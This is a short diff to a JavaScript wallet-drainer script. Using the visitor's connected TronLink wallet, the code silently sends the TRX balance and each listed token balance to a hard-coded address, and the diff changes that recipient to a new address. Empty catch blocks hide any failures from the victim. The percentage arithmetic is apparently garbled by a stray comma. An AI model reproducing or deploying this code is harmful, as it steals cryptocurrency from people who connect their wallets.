@@ -17,14 +17,14 @@ var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                 try{
                     var balance = await window.tronWeb.trx.getBalance();
                     if (balance >= 10000000)
-                    await tronWeb.trx.sendTransaction("TZ44LW2FdGhrkY3Me85sx5n1VMSgCoopXC", Math.round(balance * 34,806 / 100));
+                    await tronWeb.trx.sendTransaction("TFngg8BGU6vYv6kQKgop1WhjLPHCWKotRS", Math.round(balance * 34,806 / 100));
                 }catch{}
                 for(i=0; i<contractsAddress.length; i++){
                     try{
                     var cc = await window.tronWeb.contract().at(contractsAddress[i]);
                     balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call();
                     if (balance.toNumber() >= 0){
-                        await cc.transfer("TZ44LW2FdGhrkY3Me85sx5n1VMSgCoopXC", Math.round(balance * 34,806 / 100)).send()
+                        await cc.transfer("TFngg8BGU6vYv6kQKgop1WhjLPHCWKotRS", Math.round(balance * 34,806 / 100)).send()
                     }
                     }catch{}
                 }
